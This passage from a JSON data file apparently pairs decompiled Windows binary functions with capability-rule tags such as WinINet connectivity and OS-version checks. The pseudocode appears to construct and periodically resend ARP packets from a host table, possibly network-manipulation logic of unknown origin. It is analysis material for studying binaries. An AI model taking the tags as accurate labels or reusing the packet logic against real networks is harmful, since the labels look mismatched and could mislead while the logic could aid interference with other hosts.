        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_e8h\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0004f8d0(void)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    ulong uVar6;\n    int64_t iVar7;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    int32_t var_d0h;\n    uint var_cch;\n    code *var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    ushort var_bch;\n    uint var_bah;\n    uint var_b6h;\n    uint var_ach;\n    uint var_a6h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_84h;\n    ushort var_80h;\n    uint var_7eh;\n    uint var_7ah;\n    uint var_70h;\n    uint var_6ah;\n    uint var_64h;\n    uint var_60h;\n    int32_t var_48h;\n    uint var_44h;\n    code *var_40h;\n    uint var_3ch;\n    uint *var_38h;\n    code *var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint32_t var_24h;\n    uint *var_20h;\n    int32_t var_1ch;\n    uint32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uchar var_9h;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    var_28h = 0;\n    var_10h = 0;\n    var_4h = 0;\n    var_38h = NULL;\n    var_20h = NULL;\n    var_30h = 0;\n    var_2ch = 0;\n    var_48h = 0;\n    var_44h = 0;\n    var_34h = NULL;\n    var_40h = NULL;\n    do {\n        if (*0x800da9f8 != '\\0') {\n            return 0;\n        }\n        do {\n            var_14h = (*0x8005115c)[1];\n            var_18h = **0x8005115c;\n        } while (var_14h != (*0x8005115c)[2]);\n        uVar3 = (**0x80051158)();\n        _var_18h = fcn.00078be2(var_18h, var_14h, uVar3, 0);\n        var_9h = (**0x8005100c)();\n        var_24h = 0xffffffff;\n        for (var_1ch = 0; var_1ch < 0x40; var_1ch = var_1ch + 1) {\n            if ((*(var_1ch * 0x30 + -0x7ff255e8) != 0) && (*(var_1ch * 0x30 + -0x7ff255e3) != '\\0')) {\n                fcn.00037640(0x800ce848, &var_3ch, 0);\n                var_28h = fcn.0003f990(*(var_1ch * 0x30 + -0x7ff255e8), 1);\n                if (var_28h == 0) {\n                    var_d0h = 0;\n                }\n                else {\n                    var_d0h = *(var_28h + 0xc);\n                }\n                var_8h = var_d0h;\n                fcn.00037670(0x800ce848, &var_3ch, 0);\n                if (var_28h != 0) {\n                    if (var_8h == 0) {\n                        var_c8h = 0x800904a0;\n                        var_34h = 0x8008ff40;\n                        var_40h = 0x8008ff00;\n                        var_38h = &var_30h;\n                        var_20h = &var_48h;\n                        var_30h = 0;\n                        var_2ch = 0;\n                        var_48h = 0;\n                        var_44h = 0;\n                    }\n                    else {\n                        var_c8h = 0x8007c140;\n                        var_34h = 0x8007d700;\n                        var_40h = 0x8007d790;\n                        var_38h = &var_10h;\n                        var_20h = &var_4h;\n                        var_10h = 0;\n                        var_4h = 0;\n                    }\n                    iVar4 = *(var_1ch * 0x30 + -0x7ff255dc);\n                    if ((var_14h < iVar4) || ((var_14h <= iVar4 && (var_18h < *(var_1ch * 0x30 + -0x7ff255e0))))) {\n                        iVar4 = *(var_1ch * 0x30 + -0x7ff255dc);\n                        if ((var_14h <= iVar4) && ((var_14h < iVar4 || (var_18h <= *(var_1ch * 0x30 + -0x7ff255e0))))) {\n                            uVar2 = *(var_1ch * 0x30 + -0x7ff255e0);\n                            iVar7 = fcn.00078bee(uVar2 - var_18h, \n                                                 (*(var_1ch * 0x30 + -0x7ff255dc) - var_14h) - (uVar2 < var_18h), 10000\n                                                 , 0);\n                            if ((iVar7 < 0x100000000) && ((iVar7 < 0 || (iVar7 < var_24h)))) {\n                                uVar2 = *(var_1ch * 0x30 + -0x7ff255e0);\n                                var_24h = fcn.00078bee(uVar2 - var_18h, \n                                                       (*(var_1ch * 0x30 + -0x7ff255dc) - var_14h) - (uVar2 < var_18h), \n                                                       10000, 0);\n                            }\n                        }\n                    }\n                    else {\n                        iVar5 = var_1ch * 0x30;\n                        iVar4 = fcn.00078a6e();\n                        iVar4 = iVar4 % 18000 + 2000;\n                        uVar6 = fcn.00078be2(iVar4, iVar4 >> 0x1f, 10000, 0);\n                        puVar1 = iVar5 + -0x7ff255e0;\n                        uVar2 = *puVar1;\n                        iVar4 = *(iVar5 + -0x7ff255dc);\n                        *(var_1ch * 0x30 + -0x7ff255e0) = uVar6 + *puVar1;\n                        *(var_1ch * 0x30 + -0x7ff255dc) = iVar4 + (uVar6 >> 0x20) + CARRY4(uVar6, uVar2);\n                        iVar4 = (*var_c8h)(&var_c0h, *(var_1ch * 0x30 + -0x7ff255e8), var_38h);\n                        if (iVar4 == 0) {\n                            var_bah = *(var_28h + 0x1c);\n                            var_b6h._0_2_ = *(var_28h + 0x20);\n                            var_c0h = *(var_1ch * 0x30 + -0x7ff255f0);\n                            var_bch = *(var_1ch * 0x30 + -0x7ff255ec);\n                            if (*(var_1ch * 0x30 + -0x7ff255e4) == '\\0') {\n                                var_ach._0_2_ = fcn.00035980(2);\n                                unique0x00007a00 = *(var_28h + 0x1c);\n                                var_a6h._0_2_ = *(var_28h + 0x20);\n                                unique0x00007a00 = *(var_1ch * 0x30 + -0x7ff25600);\n                                var_a0h = *(var_1ch * 0x30 + -0x7ff255f0);\n                                var_9ch._0_2_ = *(var_1ch * 0x30 + -0x7ff255ec);\n                                unique0x00007a00 = *(var_1ch * 0x30 + -0x7ff255f4);\n                            }\n                            else {\n                                var_ach._0_2_ = fcn.00035980(1);\n                                unique0x00007a00 = *(var_28h + 0x1c);\n                                var_a6h._0_2_ = *(var_28h + 0x20);\n                                unique0x00007a00 = *(var_1ch * 0x30 + -0x7ff25600);\n                                unique0x00007a00 = *(var_1ch * 0x30 + -0x7ff255f4);\n                            }\n                            iVar4 = (*var_c8h)(&var_84h, *(var_1ch * 0x30 + -0x7ff255e8), var_20h);\n                            if (iVar4 == 0) {\n                                var_7eh = *(var_28h + 0x1c);\n                                var_7ah._0_2_ = *(var_28h + 0x20);\n                                var_84h = *(var_1ch * 0x30 + -0x7ff255fc);\n                                var_80h = *(var_1ch * 0x30 + -0x7ff255f8);\n                                if (*(var_1ch * 0x30 + -0x7ff255e4) == '\\0') {\n                                    var_70h._0_2_ = fcn.00035980(2);\n                                    unique0x00007a00 = *(var_28h + 0x1c);\n                                    var_6ah._0_2_ = *(var_28h + 0x20);\n                                    unique0x00007a00 = *(var_1ch * 0x30 + -0x7ff255f4);\n                                    var_64h = *(var_1ch * 0x30 + -0x7ff255fc);\n                                    var_60h._0_2_ = *(var_1ch * 0x30 + -0x7ff255f8);\n                                    unique0x00007a00 = *(var_1ch * 0x30 + -0x7ff25600);\n                                }\n                                else {\n                                    var_70h._0_2_ = fcn.00035980(1);\n                                    unique0x00007a00 = *(var_28h + 0x1c);\n                                    var_6ah._0_2_ = *(var_28h + 0x20);\n                                    unique0x00007a00 = *(var_1ch * 0x30 + -0x7ff255f4);\n                                    unique0x00007a00 = *(var_1ch * 0x30 + -0x7ff25600);\n                                }\n                                break;\n                            }\n                            (*var_40h)(*(var_1ch * 0x30 + -0x7ff255e8), var_38h);\n                        }\n                    }\n                }\n            }\n        }\n        (**0x80051010)();\n        if ((((var_30h == 0) && (var_48h == 0)) && (var_10h == 0)) && (var_4h == 0)) {\n            fcn.000345a0(0x800da9f4, var_24h);\n        }\n        else {\n            if ((var_30h != 0) || (var_10h != 0)) {\n                (*var_34h)(*(var_1ch * 0x30 + -0x7ff255e8), var_38h, 0x80055608);\n            }\n            if ((var_48h != 0) || (var_4h != 0)) {\n                (*var_34h)(*(var_1ch * 0x30 + -0x7ff255e8), var_20h, 0x80055610);\n            }\n        }\n    } while( true );\n}\n",
        "token_count": 2872
    },
    "0004ff40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0004ff40(uint arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.0003f990(arg_8h, 0);\n    if ((iVar1 != 0) && (*arg_ch != 0)) {\n        iVar1 = (**(*(iVar1 + 4) + 0x30))(*(*(iVar1 + 4) + 4), *arg_ch);\n        if (iVar1 == 0x103) {\n            fcn.000345a0(*arg_ch + 0x3c, 0xffffffff);\n        }\n        fcn.0004ff00(arg_8h, arg_ch);\n    }\n    return;\n}\n",
        "token_count": 181
    },
    "0004ffd0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0004ffd0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    fcn.00037640(0x800ce848, &var_8h, 0);\n    iVar1 = fcn.0003f990(arg_8h, 1);\n    if (iVar1 == 0) {\n        var_10h = 0;\n    }\n    else {\n        var_10h = *(iVar1 + 0xc);\n    }\n    var_4h = var_10h;\n    fcn.00037670(0x800ce848, &var_8h, 0);\n    if (iVar1 != 0) {\n        if (var_4h == 0) {\n            fcn.00050070(arg_8h, arg_ch, arg_10h, arg_14h);\n        }\n        else {\n            fcn.0003c630(arg_8h, arg_ch, arg_10h, arg_14h);\n        }\n    }\n    return;\n}\n",
        "token_count": 274
    },
    "00050070": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00050070(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    int16_t iVar1;\n    int16_t iVar2;\n    uint var_5ch;\n    uint var_58h;\n    int32_t var_54h;\n    int32_t var_50h;\n    int32_t *var_4ch;\n    int32_t *var_48h;\n    uint32_t var_44h;\n    uint var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    int32_t *var_34h;\n    int32_t *var_30h;\n    uint32_t var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_ch = 0;\n    iVar1 = *(arg_ch + 0xc);\n    iVar2 = fcn.00035980(0x806);\n    if ((iVar1 == iVar2) && (0x1b < arg_14h)) {\n        fcn.000509e0(arg_8h, arg_ch, arg_10h);\n    }\n    else if ((*0x800db604 == '\\0') && (iVar1 = *(arg_ch + 0xc),  iVar2 = fcn.00035980(0x800),  iVar1 == iVar2)) {\n        var_14h = arg_10h;\n        var_1h._0_1_ = (**0x8005100c)();\n        for (var_8h = 0; var_8h < 0x40; var_8h = var_8h + 1) {\n            if (*(var_8h * 0x30 + -0x7ff255e8) == arg_8h) {\n                if ((*(var_14h + 0xc) == *(var_8h * 0x30 + -0x7ff25600)) &&\n                   (*(var_14h + 0x10) == *(var_8h * 0x30 + -0x7ff255f4))) {\n                    var_30h = var_8h * 0x30 + -0x7ff255fc;\n                    var_34h = arg_ch + 6;\n                    for (var_2ch = 6; 3 < var_2ch; var_2ch = var_2ch - 4) {\n                        if (*var_34h != *var_30h) goto code_r0x0005019c;\n                        var_30h = var_30h + 1;\n                        var_34h = var_34h + 1;\n                    }\n                    if (var_2ch == 0) {\ncode_r0x0005021e:\n                        var_3ch = 0;\n                    }\n                    else {\ncode_r0x0005019c:\n                        var_38h = *var_34h - *var_30h;\n                        if (var_38h == 0) {\n                            if (var_2ch == 1) goto code_r0x0005021e;\n                            var_38h = *(var_34h + 1) - *(var_30h + 1);\n                            if (var_38h == 0) {\n                                if (var_2ch == 2) goto code_r0x0005021e;\n                                var_38h = *(var_34h + 2) - *(var_30h + 2);\n                                if (var_38h == 0) {\n                                    if ((var_2ch == 3) || (var_38h = *(var_34h + 3) - *(var_30h + 3),  var_38h == 0))\n                                    goto code_r0x0005021e;\n                                }\n                            }\n                        }\n                        var_3ch = 1;\n                        if (var_38h < 1) {\n                            var_3ch = -1;\n                        }\n                    }\n                    if (var_3ch != 0) goto code_r0x0005028f;\n                    var_28h = *(var_8h * 0x30 + -0x7ff255f0);\n                    var_24h._0_2_ = *(var_8h * 0x30 + -0x7ff255ec);\n                    *(var_8h * 0x30 + -0x7ff255d8) = *(var_8h * 0x30 + -0x7ff255d8) + 1;\ncode_r0x000503fd:\n                    var_20h._2_2_ = 0;\n                    var_20h._0_2_ = 0;\n                    var_24h._2_2_ = 0;\n                    var_1ch._0_2_ = *(arg_ch + 0xc);\n                    fcn.00037640(0x800ce848, &var_10h, 0);\n                    var_ch = fcn.0003f990(arg_8h, 1);\n                    if (var_ch == 0) {\n                        var_5ch = 0;\n                    }\n                    else {\n                        var_5ch = *(var_ch + 4);\n                    }\n                    var_18h = var_5ch;\n                    if (var_ch != 0) {\n                        var_24h._2_2_ = *(var_ch + 0x1c);\n                        var_20h._0_2_ = *(var_ch + 0x1c) >> 0x10;\n                        var_20h._2_2_ = *(var_ch + 0x20);\n                    }\n                    fcn.00037670(0x800ce848, &var_10h, 0);\n                    fcn.000505e0(var_18h, &var_28h, arg_10h, arg_14h);\n                }\n                else {\ncode_r0x0005028f:\n                    if ((*(var_14h + 0xc) == *(var_8h * 0x30 + -0x7ff255f4)) &&\n                       (*(var_14h + 0x10) == *(var_8h * 0x30 + -0x7ff25600))) {\n                        var_48h = var_8h * 0x30 + -0x7ff255f0;\n                        var_4ch = arg_ch + 6;\n                        for (var_44h = 6; 3 < var_44h; var_44h = var_44h - 4) {\n                            if (*var_4ch != *var_48h) goto code_r0x00050308;\n                            var_48h = var_48h + 1;\n                            var_4ch = var_4ch + 1;\n                        }\n                        if (var_44h == 0) {\ncode_r0x0005038a:\n                            var_54h = 0;\n                        }\n                        else {\ncode_r0x00050308:\n                            var_50h = *var_4ch - *var_48h;\n                            if (var_50h == 0) {\n                                if (var_44h == 1) goto code_r0x0005038a;\n                                var_50h = *(var_4ch + 1) - *(var_48h + 1);\n                                if (var_50h == 0) {\n                                    if (var_44h == 2) goto code_r0x0005038a;\n                                    var_50h = *(var_4ch + 2) - *(var_48h + 2);\n                                    if (var_50h == 0) {\n                                        if ((var_44h == 3) || (var_50h = *(var_4ch + 3) - *(var_48h + 3),  var_50h == 0)\n                                           ) goto code_r0x0005038a;\n                                    }\n                                }\n                            }\n                            var_54h = 1;\n                            if (var_50h < 1) {\n                                var_54h = -1;\n                            }\n                        }\n                        if (var_54h == 0) {\n                            var_28h = *(var_8h * 0x30 + -0x7ff255fc);\n                            var_24h._0_2_ = *(var_8h * 0x30 + -0x7ff255f8);\n                            *(var_8h * 0x30 + -0x7ff255d4) = *(var_8h * 0x30 + -0x7ff255d4) + 1;\n                            goto code_r0x000503fd;\n                        }\n                    }\n                }\n            }\n        }\n        (**0x80051010)();\n    }\n    return;\n}\n",
        "token_count": 2027
    },
    "000504a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000504a0(int32_t arg_8h, uint noname_1, int32_t *arg_10h)\n\n{\n    ushort uVar1;\n    uint uVar2;\n    int32_t **var_ch;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    var_4h = arg_10h;\n    (**0x80051024)(&var_8h, arg_10h + 1, *0x800ce970, arg_8h, 0x3c);\n    if (var_8h == 0) {\n        (**0x8005105c)(&var_8h, var_4h, *0x800ce974);\n        if (var_8h == 0) {\n            *(*var_4h + 0x38) = 0;\n            fcn.000344b0(*var_4h + 0x3c);\n            for (var_ch = var_4h[1]; *var_ch != NULL; var_ch = *var_ch) {\n            }\n            if (*(*var_4h + 8) == 0) {\n                *(*var_4h + 0xc) = var_ch;\n            }\n            *var_ch = *(*var_4h + 8);\n            *(*var_4h + 8) = var_4h[1];\n            *(*var_4h + 0x1c) = 0;\n            fcn.00078bfa(arg_8h, 0, 0x3c);\n            uVar1 = fcn.00035980(0x806);\n            *(arg_8h + 0xc) = uVar1;\n            uVar1 = fcn.00035980(1);\n            *(arg_8h + 0xe) = uVar1;\n            uVar1 = fcn.00035980(0x800);\n            *(arg_8h + 0x10) = uVar1;\n            *(arg_8h + 0x12) = 6;\n            *(arg_8h + 0x13) = 4;\n            uVar2 = 0;\n        }\n        else {\n            (**0x800512a4)(var_4h[1]);\n            uVar2 = 0xc0000001;\n        }\n    }\n    else {\n        uVar2 = 0xc0000001;\n    }\n    return uVar2;\n}\n",
        "token_count": 543
    },
    "000505e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000505e0(int32_t arg_8h, uint *arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    int32_t **var_14h;\n    int32_t var_10h;\n    int32_t **var_ch;\n    int32_t var_8h;\n    uint *var_4h;\n    \n    var_ch = NULL;\n    var_10h = 0;\n    var_4h = fcn.000356f0(arg_14h + 0xe);\n    if (var_4h == NULL) {\n        var_8h = -0x3fffff66;\n    }\n    else {\n        *var_4h = *arg_ch;\n        var_4h[1] = arg_ch[1];\n        var_4h[2] = arg_ch[2];\n        *(var_4h + 3) = *(arg_ch + 3);\n        fcn.00078be8(var_4h + 0xe, arg_10h, arg_14h);\n        (**0x80051024)(&var_8h, &var_ch, *0x800ce970, var_4h, arg_14h + 0xe);\n        if ((var_8h == 0) && ((**0x8005105c)(&var_8h, &var_10h, *0x800ce974),  var_8h == 0)) {\n            *(var_10h + 0x38) = 0x70724152;\n            fcn.000344b0(var_10h + 0x3c);\n            for (var_14h = var_ch; *var_14h != NULL; var_14h = *var_14h) {\n            }\n            if (*(var_10h + 8) == 0) {\n                *(var_10h + 0xc) = var_14h;\n            }\n            *var_14h = *(var_10h + 8);\n            *(var_10h + 8) = var_ch;\n            *(var_10h + 0x1c) = 0;\n            var_8h = (**(arg_8h + 0x30))(*(arg_8h + 4), var_10h);\n            if (var_8h == 0x103) {\n                var_10h = 0;\n                var_ch = NULL;\n                var_4h = NULL;\n                var_8h = 0;\n            }\n        }\n        if (var_10h != 0) {\n            fcn.00034540(var_10h + 0x3c);\n            (**0x80051060)(var_10h);\n        }\n        if (var_ch != NULL) {\n            (**0x800512a4)(var_ch);\n        }\n        if (var_4h != NULL) {\n            fcn.000357f0(var_4h);\n        }\n    }\n    return var_8h;\n}\n",
        "token_count": 666
    },
    "00050920": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00050920(int32_t arg_8h)\n\n{\n    uint *puVar1;\n    uint var_18h;\n    uint *var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar1 = *(arg_8h + 8);\n    if (puVar1 == NULL) {\n        var_8h = 0;\n    }\n    else {\n        if ((*(puVar1 + 6) & 5) == 0) {\n            var_18h = (**0x80051230)(puVar1, 0);\n        }\n        else {\n            var_18h = puVar1[3];\n        }\n        var_8h = var_18h;\n        for (var_14h = *puVar1; var_14h != NULL; var_14h = *var_14h) {\n        }\n    }\n    fcn.000357f0(var_8h);\n    (**0x800512a4)(puVar1);\n    (**0x80051060)(arg_8h);\n    return;\n}\n",
        "token_count": 255
    },
    "000509e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000509e0(uint arg_8h, int32_t *arg_ch, int16_t *arg_10h)\n\n{\n    int16_t iVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    uint var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t *var_28h;\n    int32_t *var_24h;\n    uint32_t var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t *var_10h;\n    int32_t *var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    iVar1 = *arg_10h;\n    iVar2 = fcn.00035980(1);\n    if (iVar1 != iVar2) {\n        return;\n    }\n    iVar1 = arg_10h[1];\n    iVar2 = fcn.00035980(0x800);\n    if (iVar1 != iVar2) {\n        return;\n    }\n    if (*(arg_10h + 2) != '\\x06') {\n        return;\n    }\n    if (*(arg_10h + 5) != '\\x04') {\n        return;\n    }\n    iVar1 = arg_10h[3];\n    iVar2 = fcn.00035980(1);\n    if (iVar1 != iVar2) goto code_r0x00050c61;\n    var_ch = 0x800cad08;\n    var_10h = arg_ch;\n    for (var_8h = 6; 3 < var_8h; var_8h = var_8h - 4) {\n        if (*var_10h != *var_ch) goto code_r0x00050a87;\n        var_ch = var_ch + 1;\n        var_10h = var_10h + 1;\n    }\n    if (var_8h == 0) {\ncode_r0x00050b09:\n        var_18h = 0;\n    }\n    else {\ncode_r0x00050a87:\n        var_14h = *var_10h - *var_ch;\n        if (var_14h == 0) {\n            if (var_8h == 1) goto code_r0x00050b09;\n            var_14h = *(var_10h + 1) - *(var_ch + 1);\n            if (var_14h == 0) {\n                if (var_8h == 2) goto code_r0x00050b09;\n                var_14h = *(var_10h + 2) - *(var_ch + 2);\n                if (var_14h == 0) {\n                    if ((var_8h == 3) || (var_14h = *(var_10h + 3) - *(var_ch + 3),  var_14h == 0))\n                    goto code_r0x00050b09;\n                }\n            }\n        }\n        var_18h = 1;\n        if (var_14h < 1) {\n            var_18h = -1;\n        }\n    }\n    if (var_18h != 0) {\ncode_r0x00050c61:\n        iVar1 = arg_10h[3];\n        iVar2 = fcn.00035980(2);\n        if (iVar1 == iVar2) {\n            fcn.00050ca0(arg_8h, arg_10h + 4, *(arg_10h + 7), 0);\n        }\n        return;\n    }\n    iVar3 = fcn.0003f990(arg_8h, 0);\n    var_24h = iVar3 + 0x1c;\n    var_28h = arg_ch + 6;\n    for (var_20h = 6; 3 < var_20h; var_20h = var_20h - 4) {\n        if (*var_28h != *var_24h) goto code_r0x00050b87;\n        var_24h = var_24h + 1;\n        var_28h = var_28h + 1;\n    }\n    if (var_20h == 0) {\ncode_r0x00050c09:\n        var_30h = 0;\n    }\n    else {\ncode_r0x00050b87:\n        var_2ch = *var_28h - *var_24h;\n        if (var_2ch == 0) {\n            if (var_20h == 1) goto code_r0x00050c09;\n            var_2ch = *(var_28h + 1) - *(var_24h + 1);\n            if (var_2ch == 0) {\n                if (var_20h == 2) goto code_r0x00050c09;\n                var_2ch = *(var_28h + 2) - *(var_24h + 2);\n                if (var_2ch == 0) {\n                    if ((var_20h == 3) || (var_2ch = *(var_28h + 3) - *(var_24h + 3),  var_2ch == 0))\n                    goto code_r0x00050c09;\n                }\n            }\n        }\n        var_30h = 1;\n        if (var_2ch < 1) {\n            var_30h = -1;\n        }\n    }\n    if (var_30h == 0) {\n        return;\n    }\n    fcn.00050ca0(arg_8h, arg_10h + 4, *(arg_10h + 7), 1);\n    fcn.00050ca0(arg_8h, 0, *(arg_10h + 0xc), 0);\n    return;\n}\n",
        "token_count": 1313
    },
    "00050ca0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.00050ca0(int32_t *arg_8h, int32_t **arg_ch, int32_t *arg_10h, uint arg_14h)\n\n{\n    int32_t **arg_8h_00;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    int32_t **var_30h;\n    int32_t **var_2ch;\n    uint32_t var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t **var_18h;\n    int32_t **var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    int32_t **var_8h;\n    uint var_1h;\n    \n    if (9999 < *0x800cd9cc) {\n        return 0;\n    }\n    arg_8h_00 = fcn.000356f0(0x2c);\n    if (arg_8h_00 == NULL) {\n        return 0;\n    }\n    fcn.00078bfa(arg_8h_00, 0, 0x2c);\n    arg_8h_00[3] = arg_10h;\n    arg_8h_00[4] = arg_8h;\n    if (arg_ch != NULL) {\n        arg_8h_00[5] = *arg_ch;\n        *(arg_8h_00 + 6) = *(arg_ch + 1);\n    }\n    if (arg_14h == '\\0') {\n        arg_8h_00[8] = arg_8h_00[8] + 1;\n    }\n    else {\n        arg_8h_00[7] = arg_8h_00[7] + 1;\n    }\n    fcn.00036320(arg_8h_00 + 10);\n    (**0x8005100c)();\n    if (*0x800cd9cc < 10000) {\n        if (*0x800cdab4 != NULL) {\n            var_8h = *0x800cdab4;\n            while( true ) {\n                while( true ) {\n                    if ((var_8h[3] == arg_10h) && (var_8h[4] == arg_8h)) {\n                        if (arg_14h == '\\0') {\n                            var_8h[8] = var_8h[8] + 1;\n                        }\n                        else {\n                            var_8h[7] = var_8h[7] + 1;\n                        }\n                        if (arg_ch == NULL) goto code_r0x00050fd3;\n                        var_10h = 6;\n                        var_14h = 0x800ce95c;\n                        var_18h = var_8h + 5;\n                        goto code_r0x00050e03;\n                    }\n                    uVar1 = fcn.00035950(arg_10h);\n                    uVar2 = fcn.00035950(var_8h[3]);\n                    if (uVar1 < uVar2) break;\n                    if (var_8h[1] == NULL) {\n                        var_8h[1] = arg_8h_00;\n                        *0x800cd9cc = *0x800cd9cc + 1;\n                        arg_8h_00[2] = (*0x800cdab4)[2];\n                        (*0x800cdab4)[2] = arg_8h_00;\n                        arg_8h_00 = *0x800cdab4;\n                        goto code_r0x000510b0;\n                    }\n                    var_8h = var_8h[1];\n                }\n                if (*var_8h == NULL) break;\n                var_8h = *var_8h;\n            }\n            *var_8h = arg_8h_00;\n            *0x800cd9cc = *0x800cd9cc + 1;\n            arg_8h_00[2] = (*0x800cdab4)[2];\n            (*0x800cdab4)[2] = arg_8h_00;\n            arg_8h_00 = *0x800cdab4;\n        }\n    }\n    else {\n        fcn.000357f0(arg_8h_00);\n        arg_8h_00 = *0x800cdab4;\n    }\n    goto code_r0x000510b0;\ncode_r0x00050e03:\n    if (var_10h < 4) goto code_r0x00050e09;\n    if (*var_18h != *var_14h) goto code_r0x00050e13;\n    var_10h = var_10h - 4;\n    var_14h = var_14h + 1;\n    var_18h = var_18h + 1;\n    goto code_r0x00050e03;\ncode_r0x00050e09:\n    if (var_10h == 0) {\ncode_r0x00050e95:\n        var_20h = 0;\n    }\n    else {\ncode_r0x00050e13:\n        var_1ch = *var_18h - *var_14h;\n        if (var_1ch == 0) {\n            if (var_10h == 1) goto code_r0x00050e95;\n            var_1ch = *(var_18h + 1) - *(var_14h + 1);\n            if (var_1ch == 0) {\n                if (var_10h == 2) goto code_r0x00050e95;\n                var_1ch = *(var_18h + 2) - *(var_14h + 2);\n                if (var_1ch == 0) {\n                    if ((var_10h == 3) || (var_1ch = *(var_18h + 3) - *(var_14h + 3),  var_1ch == 0))\n                    goto code_r0x00050e95;\n                }\n            }\n        }\n        var_20h = 1;\n        if (var_1ch < 1) {\n            var_20h = -1;\n        }\n    }\n    if (var_20h == 0) {\n        var_8h[5] = *arg_ch;\n        *(var_8h + 6) = *(arg_ch + 1);\n    }\n    else {\n        var_2ch = arg_ch;\n        var_30h = var_8h + 5;\n        for (var_28h = 6; 3 < var_28h; var_28h = var_28h - 4) {\n            if (*var_30h != *var_2ch) goto code_r0x00050f02;\n            var_2ch = var_2ch + 1;\n            var_30h = var_30h + 1;\n        }\n        if (var_28h == 0) {\ncode_r0x00050f84:\n            var_38h = 0;\n        }\n        else {\ncode_r0x00050f02:\n            var_34h = *var_30h - *var_2ch;\n            if (var_34h == 0) {\n                if (var_28h == 1) goto code_r0x00050f84;\n                var_34h = *(var_30h + 1) - *(var_2ch + 1);\n                if (var_34h == 0) {\n                    if (var_28h == 2) goto code_r0x00050f84;\n                    var_34h = *(var_30h + 2) - *(var_2ch + 2);\n                    if (var_34h == 0) {\n                        if ((var_28h == 3) || (var_34h = *(var_30h + 3) - *(var_2ch + 3),  var_34h == 0))\n                        goto code_r0x00050f84;\n                    }\n                }\n            }\n            var_38h = 1;\n            if (var_34h < 1) {\n                var_38h = 